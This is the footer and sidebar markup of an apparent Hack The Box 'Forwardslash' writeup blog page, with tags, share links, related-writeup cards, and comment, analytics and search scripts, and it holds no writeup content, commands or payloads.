href="/tags/php-wrapper/" class="post-tag no-text-decoration" >php-wrapper</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Forwardslash writeup - 0xPrashant&url=http://localhost:4000/posts/htb-forwardslash/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Forwardslash writeup - 0xPrashant&u=http://localhost:4000/posts/htb-forwardslash/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Forwardslash writeup - 0xPrashant&url=http://localhost:4000/posts/htb-forwardslash/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-book/"><div class="card-body"> <span class="timeago small" > Mar 2 <i class="unloaded">2020-03-02T16:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Book writeup</h3><div class="text-muted small"><p> Information Column Details Name Book Points 30 Difficulty Medium Creator MrR3boot...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-cascade/" class="btn btn-outline-primary"><p>Hackthebox Cascade writeup</p></a> <a href="/posts/htb-servmon/" class="btn btn-outline-primary"><p>Hackthebox Servmon writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-forwardslash/'; this.page.identifier = '/posts/htb-forwardslash/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
